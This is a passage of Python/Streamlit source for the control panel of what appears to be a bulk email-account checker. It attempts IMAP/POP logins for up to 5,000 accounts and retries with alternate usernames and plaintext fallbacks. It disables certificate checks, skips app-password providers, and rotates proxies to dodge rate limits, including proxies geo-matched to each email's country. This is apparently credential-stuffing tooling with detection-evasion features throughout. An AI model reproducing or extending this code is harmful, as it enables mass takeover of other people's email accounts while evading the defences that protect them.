        state_data = str_lit.session_state.help_states[key_name]
        if state_data.get("visible", False) and time.time() - state_data.get("time", 0) > 10.0:
            str_lit.session_state.help_states[key_name]["visible"] = False

        col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
        val = None
        with col_lbl:
            if widget_type == "label":
                str_lit.markdown(f"**{label_text}**")
            elif widget_type == "checkbox":
                try:
                    val = str_lit.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
                except Exception as widget_err:
                    str_lit.error(f"Widget payload/input error: {widget_err}")
                    val = kwargs.get("value", False)
            elif widget_type in ["text", "selectbox"]:
                str_lit.markdown(f"**{label_text}**")

        with col_btn:
            if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
                try:
                    current = str_lit.session_state.help_states[key_name]["visible"]
                    str_lit.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
                except Exception as btn_err:
                    warnings.warn(f"State transition error in help button: {btn_err}")

        if str_lit.session_state.help_states[key_name]["visible"]:
            str_lit.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

        if widget_type == "checkbox":
            return val
    except Exception as e:
        warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
    return None

# ============================================================================
# SIDEBAR — ENGINE CONTROL PANEL
# ============================================================================

str_lit.sidebar.header("⚙ Engine Control Panel")

checker_mode = str_lit.sidebar.selectbox(
    "⚡ Select Engine Mode:",
    options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
    index=0,
    help="Normal: balanced. Fast: syntax + MX pre-filter, rapid ports. Deep: maximum depth, multiple fallbacks, strict validation."
)

if checker_mode == "Fast Mode":
    engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
                                  connect_timeout=3.0, read_timeout=3.0, max_retries=1, failure_cooldown=60.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 100, 30, 5)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 5, 120, 45, 5)
    timeout = str_lit.sidebar.slider("Timeout", 1, 25, 10, 1)
    default_hosts = 2
elif checker_mode == "Deep / Aggressive Mode":
    engine_config = CheckerConfig(mode_name="Deep", fast_mode=False, max_concurrent_checks=30,
                                  connect_timeout=10.0, read_timeout=10.0, max_retries=4, failure_cooldown=10.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 50, 8, 1)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 300, 120, 5)
    timeout = str_lit.sidebar.slider("Timeout", 5, 45, 15, 1)
    default_hosts = 4
else:
    engine_config = CheckerConfig(mode_name="Normal", fast_mode=False, max_concurrent_checks=50,
                                  connect_timeout=5.0, read_timeout=5.0, max_retries=1, failure_cooldown=30.0)
    workers = str_lit.sidebar.slider("Workers Start", 1, 75, 15, 5)
    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 180, 90, 5)
    timeout = str_lit.sidebar.slider("Timeout", 2, 30, 12, 1)
    default_hosts = 3

max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, 5000, 100)
blacklist_cf = str_lit.sidebar.slider(
    "Blacklist CF (consecutive proxy fails)", 3, 100, 15, 1,
    help="A proxy is circuit-broken for 30s after this many consecutive network failures."
)

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
dynamic_worker_scaling = str_lit.sidebar.toggle("⚡ Thread Auto-Scaling / Dynamic Workers", value=True,
                                                help="Let the engine scale worker threads with live network conditions.")
max_hosts_per_domain = str_lit.sidebar.slider(
    "Max Hosts Per Domain", 1, 8, default_hosts, 1,
    help="How many discovered IMAP hosts to try per account. STARTTLS / plain and POP rungs are capped separately."
)
try_alt_username_ui = str_lit.sidebar.toggle(
    "Try local-part username on auth failure", value=True,
    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than 'user@domain'. On an auth rejection the engine retries the same host with the local part before moving on."
)

smtp_precheck_ui = str_lit.sidebar.checkbox(
    "📮 Enable SMTP pre-check  (OFF by default)",
    value=False,
    help="OFF (default): the engine only does IMAP/POP. Fastest start, and the 'SMTP Failed' bucket stays at 0.\n\n"
         "ON: before checking, every unseen domain gets one SMTP probe on 587/465/25 and dead-SMTP domains "
         "are bucketed under 'SMTP Failed' (right after 'DNS Failed') and removed from the check queue. "
         "Costs an extra connect per new domain on the first run; cached 15 min after that."
)

custom_whitelist_input = str_lit.sidebar.text_input("Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com")
custom_blacklist_input = str_lit.sidebar.text_input("Custom Blacklist Domains (comma-separated)", placeholder="spamdomain.com")

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
min_proxy_score = str_lit.sidebar.slider(
    "Min Proxy Score", 0, 100, 10, 10,
    help="A node is dropped from the pool once its score falls below this."
)
proxy_precheck_timeout = str_lit.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 5, 1)
probe_timeout_ui = str_lit.sidebar.slider(
    "Tunnel Probe Timeout (Sec)", 3, 20, 8, 1,
    help="How long a node gets to open a real CONNECT tunnel to the probe target."
)
probe_target_ui = str_lit.sidebar.selectbox(
    "Tunnel Probe Target",
    ["993 (IMAP)", "443 (HTTPS)", "windstream 993", "windstream 995", "both (either)"],
    index=0,
    help="993 proves the node can carry IMAP. 443 proves it can carry HTTPS. "
         "'windstream 993' proves the node can reach the ACTUAL mail host - a pool that is "
         "60/60 against Gmail can be 0/60 against Windstream. "
         "'both (either)' passes if either one works."
)
probe_strict_ui = str_lit.sidebar.toggle(
    "Strict tunnel probe", value=True,
    help="ON (default): only nodes that pass the probe enter the live pool, so 'Alive: 0' means what it says. "
         "OFF: if the entire pool fails the probe it is used anyway (the old v13.19 behaviour)."
)
dedupe_proxies_ui = str_lit.sidebar.toggle(
    "Deduplicate proxy pool", value=True,
    help="ON (default): collapse repeated host:port lines in proxies.txt so the pool, the scores and the fail "
         "counters reflect distinct boxes instead of duplicates."
)
allow_blacklist_ips = str_lit.sidebar.toggle(
    "Allow Blacklisted / Flagged Proxy IPs", value=False,
    help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool AND the live ladder."
)
proxy_quarantine_ui = str_lit.sidebar.toggle(
    "🩹 Quarantine nodes that return 407", value=True,
    help="ON (default): a node that answers '407 Proxy Authentication Required' twice is pulled out of the pool "
         "for the rest of the run. NOTE: a plain socket reset is NOT a 407 and no longer counts toward this."
)

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🚦 Concurrency Governors")
host_concurrency_ui = str_lit.sidebar.slider(
    "Per-Host Connection Cap", 1, 12, HOST_CONCURRENCY_DEFAULT, 1,
    help="Max simultaneous connections to ONE mail hostname. 3 is right for legacy ISP IMAP. "
         "Raise it for Gmail/O365-only lists."
)
proxy_ip_concurrency_ui = str_lit.sidebar.slider(
    "Per-Proxy-IP Connection Cap", 1, 12, PROXY_IP_CONCURRENCY_DEFAULT, 1,
    help="v13.29. Max simultaneous tunnels through ONE proxy IP. Your pool is many LINES but few "
         "distinct IPs, so this is the cap the mail server actually sees. A legacy IMAP front will "
         "answer one connection from an IP and reset the next - if you see 'Socket error / reset by peer' "
         "on nodes that just worked, LOWER this to 1."
)
proxy_concurrency_ui = str_lit.sidebar.slider(
    "Global Proxy Connection Cap", 2, 60, PROXY_CONCURRENCY_DEFAULT, 1,
    help="Max simultaneous proxy tunnels across the whole run."
)
direct_first_ui = str_lit.sidebar.toggle(
    "⚡ Direct-First (try the direct egress before the proxy)", value=DIRECT_FIRST_DEFAULT,
    help="ON: run the DIRECT sweep first and only fall back to the proxy. Also auto-engages per account "
         "when >50% of the pool is quarantined."
)
same_host_retries_ui = str_lit.sidebar.slider(
    "Same-Host Retries on a SLOW answer", 0, 4, SAME_HOST_RETRIES_DEFAULT, 1,
    help="Only applies to READ-level slowness. A CONNECT-level timeout rotates the node once and advances."
)

str_lit.sidebar.markdown("---")
str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
proxy_random_rotation = str_lit.sidebar.toggle(
    "🔀 Proxy Random Rotation", value=True,
    help="ON (default): a DIFFERENT random node is used for every attempt, with a per-account avoid-set."
)
geo_call_proxy = str_lit.sidebar.toggle(
    "🌍 Geo-Call Proxy", value=False,
    help="Prefer a node whose geo matches the email's country/region. Falls back to the general pool on failure."
)
my_connection = str_lit.sidebar.selectbox(
    "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"], index=0,
    help="Diagnostic only."
)

if "pool_mode" not in str_lit.session_state:
    str_lit.session_state.pool_mode = "all"
if "pool_locked" not in str_lit.session_state:
    str_lit.session_state.pool_locked = True
if "picked_countries" not in str_lit.session_state:
    str_lit.session_state.picked_countries = []

def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
                log_startup(f"Successfully loaded JSON cache from {path}.")
                return data
        except Exception as e:
            log_startup(f"WARNING: Failed to load JSON file {path}: {e}")
            return default
    log_startup(f"JSON cache file {path} not found. Using default.")
    return default

domain_cache = load_json("domain_cache.json", {})
proxy_meta = STATE["meta"]

def load_proxies(quiet: bool = False):
    """Proxies come from proxies.txt only."""
    if not os.path.exists("proxies.txt"):
        try:
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    if OXYLABS_PROXIES:
                        f.write("\n".join(OXYLABS_PROXIES) + "\n")
            log_startup(f"Created proxies.txt (seeded from secrets: {len(OXYLABS_PROXIES)}).", quiet=quiet)
        except Exception as e:
            log_startup(f"WARNING: Failed to initialize proxies.txt: {e}", quiet=quiet)
    try:
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            uniq = list(dict.fromkeys(raw_list))
            if len(uniq) != len(raw_list):
                log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt "
                            f"({len(uniq)} unique after dedupe).", quiet=quiet)
            raw_list = uniq
        else:
            log_startup(f"Loaded {len(raw_list)} proxies from proxies.txt.", quiet=quiet)
        return raw_list
    except Exception as e:
        log_startup(f"WARNING: Failed to read proxies.txt: {e}", quiet=quiet)
        return []

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        if (success_count + fail_count) == 0:
            return initial_latency_score
        sr = ((success_count + 2) / (success_count + fail_count + 3)) * 100
        return max(0, min(100, int(sr - (fail_count * 5))))
    except Exception:
        return initial_latency_score

def is_proxy_alive(proxy_host, proxy_port, timeout=2):
    try:
        with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
            return True
    except Exception:
        return False

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception:
        pass
    return None

# ---------------------------------------------------------------------------
# PROXY-LAYER HELPERS
# ---------------------------------------------------------------------------
def proxy_is_quarantined(proxy_str) -> bool:
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        return proxy_str in proxy_quarantine

def quarantine_proxy(proxy_str, reason=""):
    if not proxy_str:
        return False
    with proxy_quarantine_lock:
        if proxy_str in proxy_quarantine:
            return False
        proxy_quarantine.add(proxy_str)
        size = len(proxy_quarantine)
    with alive_pool_lock:
        total = len(alive_pool)
    log_startup(f"Proxy quarantined ({reason or '407'}): {proxy_str} "
                f"[{size} quarantined / {total} alive]", quiet=True)
    log_probe_event(f"QUARANTINE {proxy_str} ({reason or '407'}) [{size}/{total}]")
    return True

def quarantine_size() -> int:
    with proxy_quarantine_lock:
        return len(proxy_quarantine)

def clear_proxy_quarantine():
    with proxy_quarantine_lock:
        proxy_quarantine.clear()
    _proxy_407.clear()
    log_probe_event("quarantine cleared by user")

def _scheme_order(proxy_str):
    """Try the scheme that last worked for this node FIRST.

    v13.28: HTTP IS NOW THE DEFAULT.  A Webshare-style node very often speaks
    HTTP CONNECT with the same credentials it REJECTS over SOCKS5 (255), so
    leading with SOCKS5 cost a wasted round trip AND opened a second TCP
    connection to the proxy on every attempt.
    """
    with _proxy_scheme_lock:
        pref = _proxy_scheme.get(proxy_str)
    if pref == socks.SOCKS5:
        return (socks.SOCKS5, socks.HTTP)
    return (socks.HTTP, socks.SOCKS5)

def _remember_scheme(proxy_str, ptype):
    with _proxy_scheme_lock:
        _proxy_scheme[proxy_str] = ptype

# ---------------------------------------------------------------------------
# LIVE GEO
# ---------------------------------------------------------------------------
def geo_lookup(ip):
    if not ip or ip == "Unknown":
        return ("Unknown", "Unknown")
    with _GEO_LOCK:
        hit = _GEO_CACHE.get(ip)
    if hit:
        return hit
    country, region = "Unknown", "Unknown"
    try:
        if requests is not None:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName", timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    country = data.get("country") or "Unknown"
                    region = data.get("regionName") or "Unknown"
    except Exception:
        pass
    with _GEO_LOCK:
        _GEO_CACHE[ip] = (country, region)
    return country, region

def public_ip(force=False):
    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
        return _PUBLIC_IP["ip"]
    with _PUBLIC_IP_LOCK:
        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
            return _PUBLIC_IP["ip"]
        ip = ""
        try:
            if requests is not None:
                ip = (requests.get("https://api.ipify.org", timeout=3).text or "").strip()
        except Exception:
            ip = ""
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except Exception:
                ip = ""
        if ip:
            _PUBLIC_IP.update(ip=ip, ts=time.time())
        return ip or "Unknown"

def direct_isp(force=False):
    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < 600:
        return _DIRECT_ISP["isp"]
    ip = public_ip()
    isp = ""
    try:
        if requests is not None and ip and ip != "Unknown":
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as", timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    isp = " ".join(str(data.get(k) or "") for k in ("isp", "org", "as")).strip()
    except Exception:
        isp = ""
    _DIRECT_ISP.update(isp=isp, ts=time.time())
    return isp

def vpn_state_label():
    hint = CFG.get("CONNECTION_HINT", "Auto")
    if hint in ("VPN ON", "VPN OFF"):
        return hint
    isp = (direct_isp() or "").lower()
    if isp and any(t in isp for t in _VPN_BRANDS):
        return "VPN ON (auto)"
    return "VPN OFF (auto)"

def direct_geo(force=False):
    if not force and time.time() - _DIRECT_GEO["ts"] < 600 and _DIRECT_GEO["ip"]:
        return dict(_DIRECT_GEO)
    with _DIRECT_GEO_LOCK:
        if not force and time.time() - _DIRECT_GEO["ts"] < 600 and _DIRECT_GEO["ip"]:
            return dict(_DIRECT_GEO)
        ip = public_ip(force=force)
        country, region = geo_lookup(ip)
        _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country, region=region, vpn=vpn_state_label())
        return dict(_DIRECT_GEO)

def tld_country(domain):
    for part in reversed((domain or "").lower().split(".")):
        if part in TLD_COUNTRY:
            return TLD_COUNTRY[part]
    return None

def enrich_proxy_geo(proxies, max_workers=8):
    todo = []
    for p in proxies:
        meta = proxy_meta.get(p)
        if not meta or not meta.get("country") or meta.get("country") == "Unknown":
            info = parse_proxy(p)
            if info:
                todo.append((p, info["host"]))
    if not todo:
        return

    def _one(item):
        p, host = item
        return p, host, geo_lookup(host)

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for p, host, (country, region) in ex.map(_one, todo):
                with proxy_lock:
                    m = proxy_meta.setdefault(p, {"fails": 0, "success": 0, "score": 60, "latency_ms": 0})
                    m["country"], m["region"] = country, region
    except Exception as e:
        log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)

def test_single_proxy(proxy_str, target=None):
    try:
        info = parse_proxy(proxy_str)
        if not info or not SOCKS_OK:
            return False, "Invalid Format", "Unknown", 0
        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", 5))):
            record_probe_result(proxy_str, False, "tcp", error="direct TCP to proxy port failed")
            return False, "TCP Connection Timeout", "Unknown", 0

        res = tunnel_probe(proxy_str)
        latency = int(res.get("latency_ms", 0) or 0)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=latency, target=res.get("target", ""),
                            scheme=res.get("scheme"), error=res.get("error", ""))

        country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
        region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
        if country == "Unknown":
            country, region = geo_lookup(info["host"])

        initial_score = max(0, min(100, 100 - int(latency / 15)))
        with proxy_lock:
            m = proxy_meta.setdefault(
                proxy_str,
                {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0})
            if res["ok"]:
                m["success"] = m.get("success", 0) + 1
                consecutive_proxy_failures[proxy_str] = 0
            else:
                m["fails"] = m.get("fails", 0) + 1
                consecutive_proxy_failures[proxy_str] += 1
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0),
                                            initial_latency_score=initial_score)
            m["country"], m["region"], m["latency_ms"] = country, region, latency
            current_score = m["score"]

        if res["ok"]:
            return True, f"{latency}ms", f"{country}, {region}", current_score
        label = _PROBE_REASON_LABEL.get(res["reason"], res["reason"])
        return False, f"Probe failed: {label}", f"{country}, {region}", current_score
    except Exception as e:
        return False, f"Error: {str(e)[:30]}", "Unknown", 0

def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = str(meta.get("country", "Unknown")).upper()
            if c == "UNKNOWN" or not c:
                info = parse_proxy(p)
                if info:
                    c = geo_lookup(info["host"])[0].upper()
            country_scores[c].append(meta.get("score", 50))
        ranked = sorted(((c, sum(s) / len(s)) for c, s in country_scores.items() if s), key=lambda x: x[1], reverse=True)
        return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
    except Exception:
        return []

if "pool_pick" not in str_lit.session_state:
    str_lit.session_state.pool_pick = None

selected_countries = list(str_lit.session_state.picked_countries)
selected_mix_countries = list(str_lit.session_state.picked_countries)
pool_mode = str_lit.session_state.pool_mode

if str_lit.session_state.pool_locked:
    str_lit.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        str_lit.sidebar.caption("Picked: " + ", ".join(str_lit.session_state.picked_countries))
    if str_lit.sidebar.button("Change pool"):
        str_lit.session_state.pool_locked = False
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
else:
    str_lit.sidebar.caption("Tap one")
    for _lbl, _mode in (("all", "all"), ("us_only", "us_only"), ("country", "country"), ("mix", "mix")):
        if str_lit.sidebar.button(_lbl, key=f"pool_btn_{_mode}"):
            if _mode in ("country", "mix"):
                str_lit.session_state.pool_pick = _mode
            else:
                str_lit.session_state.pool_mode = _mode
                str_lit.session_state.pool_locked = True
                str_lit.session_state.pool_pick = None
            str_lit.rerun()
    choice = str_lit.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores() or ["US"]
        with str_lit.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                label = c
                if choice == "mix":
                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in load_proxies()
                              if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                    label = f"{c}  score={max(scores) if scores else 0}"
                if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if str_lit.form_submit_button("Done"):
                if not picked:
                    str_lit.sidebar.error("Pick at least one country")
                else:
                    str_lit.session_state.pool_mode = choice
                    str_lit.session_state.picked_countries = picked
                    str_lit.session_state.pool_locked = True
                    str_lit.session_state.pool_pick = None
                    str_lit.rerun()

str_lit.sidebar.markdown("---")

use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting. UNCHECK for a fully direct connection.", "Use Proxy", widget_type="checkbox", value=True)
retry_cf = instant_help("retry_cf", "After the proxy route fails with a NETWORK error, make one extra pass with a direct connection.", "Retry CF (Direct Retry)", widget_type="checkbox", value=True)
self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
proxy_test_flight = instant_help("proxy_test_flight", "Probe every proxy for liveness before it enters the live pool.", "Test Flight", widget_type="checkbox", value=True)
skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront.", "Skip Strict App-Only Providers", widget_type="checkbox", value=True)
debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing directly into the UI interface.", "Enable Debug Mode", widget_type="checkbox", value=True)

try_starttls_ui = str_lit.sidebar.toggle(
    "Enable STARTTLS + plaintext fallback (143 / 110)", value=True,
    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over plaintext."
)

resolved_proxy_mode = str_lit.sidebar.selectbox(
    "Proxy Mode Engine:", options=["aggressive", "fallback", "sticky", "off"], index=1,
    help="aggressive: proxy only. fallback: proxy then direct. sticky: one proxy per worker thread. off: never use proxies."
)

def build_cfg():
    return {
        "MODE_NAME": engine_config.mode_name,
        "MAX_WORKERS_START": workers,
        "MAX_WORKERS_MAX": max(workers * 2, engine_config.max_concurrent_checks),
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": resolved_proxy_mode if use_proxy else "off",
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        "TLS_STRICT": False,
        "TRY_STARTTLS": try_starttls_ui,
        "TRY_ALT_USERNAME": try_alt_username_ui,
        "MAX_HOSTS_PER_DOMAIN": max_hosts_per_domain,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "PROBE_TIMEOUT": probe_timeout_ui,
        "PROBE_TARGET": probe_target_ui,
        "PROBE_STRICT": probe_strict_ui,
        "DEDUPE_PROXIES": dedupe_proxies_ui,
        "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
        "QUARANTINE_407": proxy_quarantine_ui,
        "HOST_CONCURRENCY": host_concurrency_ui,
        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,   # v13.29
        "PROXY_CONCURRENCY": proxy_concurrency_ui,
        "DIRECT_FIRST": direct_first_ui,
        "SAME_HOST_RETRIES": same_host_retries_ui,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": "mail_results",
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode,
        "FAILURE_COOLDOWN": engine_config.failure_cooldown,
        "RANDOM_ROTATION": proxy_random_rotation,
        "GEO_CALL": geo_call_proxy,
        "CONNECTION_HINT": my_connection,
        "SMTP_CHECK": smtp_precheck_ui,
    }

if "applied_cfg" not in str_lit.session_state:
    str_lit.session_state.applied_cfg = build_cfg()

_settings_dirty = build_cfg() != str_lit.session_state.applied_cfg
if _settings_dirty:
    str_lit.sidebar.warning("⚠ You have UNAPPLIED settings changes. Click 💾 Apply Settings.")

if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
    str_lit.session_state.applied_cfg = build_cfg()
    _reset_gates()
    str_lit.sidebar.success("Settings applied successfully!")
    log_startup("User applied new configuration settings via sidebar control panel.")
    str_lit.rerun()

CFG = str_lit.session_state.applied_cfg

for _k, _v in (
    ("ALLOW_SELF_SIGNED", True), ("TLS_STRICT", False), ("TRY_STARTTLS", True),
    ("TRY_ALT_USERNAME", True), ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", 12),
    ("ACCOUNT_DEADLINE", 90), ("PROXY_CONNECT_TIMEOUT", 5.0), ("FAILURE_COOLDOWN", 30.0),
    ("FAST_MODE", False), ("BLACKLIST_CF", 15), ("DEBUG", False), ("PROXY_TEST_FLIGHT", True),
    ("RETRY_CONNECTION_FAILED", 0), ("MAX_ACCOUNTS", 5000), ("MAX_WORKERS_START", 15),
    ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"), ("ALLOW_BLACKLIST_IPS", False),
    ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"), ("SMTP_CHECK", False),
    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", 10), ("PROXY_PRECHECK_TIMEOUT", 5),
    ("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT), ("PROBE_TARGET", PROBE_TARGET_DEFAULT),
    ("PROBE_STRICT", PROBE_STRICT_DEFAULT), ("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT),
    ("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT), ("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT),
    ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
    ("DIRECT_FIRST", DIRECT_FIRST_DEFAULT), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
):
    CFG.setdefault(_k, _v)

log_startup(
    f"ACTIVE CONFIG -> mode={CFG.get('MODE_NAME')} workers={CFG.get('MAX_WORKERS_START')} "
    f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
    f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
    f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
    f"smtp_precheck={CFG.get('SMTP_CHECK')} quarantine_407={CFG.get('QUARANTINE_407')} "
    f"probe_target={CFG.get('PROBE_TARGET')} probe_timeout={CFG.get('PROBE_TIMEOUT')}s "
    f"probe_strict={CFG.get('PROBE_STRICT')} dedupe={CFG.get('DEDUPE_PROXIES')} "
    f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
    f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
    f"direct_first={CFG.get('DIRECT_FIRST')} same_host_retries={CFG.get('SAME_HOST_RETRIES')}"
)

# ============================================================================
# SIDEBAR — 🎨 THEME STUDIO
# ============================================================================

with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
    th = str_lit.session_state.theme

    _preset_names = list(THEME_PRESETS.keys())
    _seed = {
        "th_preset": th.get("preset", "Aurora") if th.get("preset", "Aurora") in _preset_names else "Aurora",
        "th_g1": th["g1"], "th_g2": th["g2"],
        "th_accent": th["accent"], "th_accent2": th["accent2"],
        "th_bg": th["bg"], "th_panel": th["panel"], "th_text": th["text"],
        "th_radius": int(th.get("radius", 14)),
        "th_glow": bool(th.get("glow", True)),
        "th_glass": bool(th.get("glass", True)),
        "th_animate": bool(th.get("animate", True)),
        "th_hero_title": th.get("hero_title", ""),
        "th_hero_sub": th.get("hero_sub", ""),
    }
    for _k, _v in _seed.items():
        if _k not in str_lit.session_state:
            str_lit.session_state[_k] = _v

    str_lit.selectbox("Preset Gradient", _preset_names, key="th_preset", on_change=_on_preset_change)

    c_a, c_b = str_lit.columns(2)
    with c_a:
        str_lit.color_picker("Gradient Start", key="th_g1")
        str_lit.color_picker("Accent", key="th_accent")
        str_lit.color_picker("Page Background", key="th_bg")
    with c_b:
        str_lit.color_picker("Gradient End", key="th_g2")
        str_lit.color_picker("Accent 2", key="th_accent2")
        str_lit.color_picker("Panel Surface", key="th_panel")

    str_lit.color_picker("Body Text", key="th_text")
    str_lit.slider("Corner Radius", 0, 28, key="th_radius")

    t_a, t_b = str_lit.columns(2)
    with t_a:
        str_lit.toggle("Neon Glow", key="th_glow")
        str_lit.toggle("Glass Blur", key="th_glass")
    with t_b:
        str_lit.toggle("Animated Gradient", key="th_animate")
        str_lit.toggle("Colourised Logs", key="colorize_logs")

